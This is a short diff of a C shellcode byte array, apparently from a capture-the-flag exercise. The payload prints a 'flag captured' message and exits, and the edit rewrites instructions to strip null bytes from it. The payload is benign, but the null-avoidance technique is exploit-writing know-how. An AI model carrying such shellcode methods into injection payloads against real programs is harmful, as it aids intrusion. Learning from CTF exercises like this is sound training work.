@@ -93,7 +93,13 @@ unsigned char payload[] =
 	 * push
 	 * "\n[+] w00t!\n[+] Congratulations, you captured 'Flag 4/5/6'!\n\0"
 	 */
-	"\x68" "\x27\x21\x0a\x00"
+	
+	//"\x68" "\x27\x21\x0a\x00"
+	// Pushes a larger value into the register, then subtracts it
+	"\xba\x28\x22\x1a\x01"
+	"\x81\xea\x01\x01\x10\x01"
+	"\x52"
+
 	"\x75\x07"
 	"\x68" "\x61\x67\x20\x36"
 	"\xeb\x1f"
@@ -129,8 +135,9 @@ unsigned char payload[] =
 	"\x58"		/* pop    %eax		*/ /* arg2: sizeof(str)		*/
 	"\xcd\x80"	/* int    $0x80		*/
 	/* ------------------------------------	*/
-	"\x6a\x00"	/* push   $0x0		*/
-	"\x5b"		/* pop    %ebx		*/
+	//"\x6a\x00"	/* push   $0x0		*/
+	//"\x5b"		/* pop    %ebx		*/
+	"\x87\xde"
 	"\x6a\x01"	/* push   $0x1		*/ /* exit(EXIT_SUCCESS)	*/
 	"\x58"		/* pop    %eax		*/
 	"\xcd\x80"	/* int    $0x80		*/
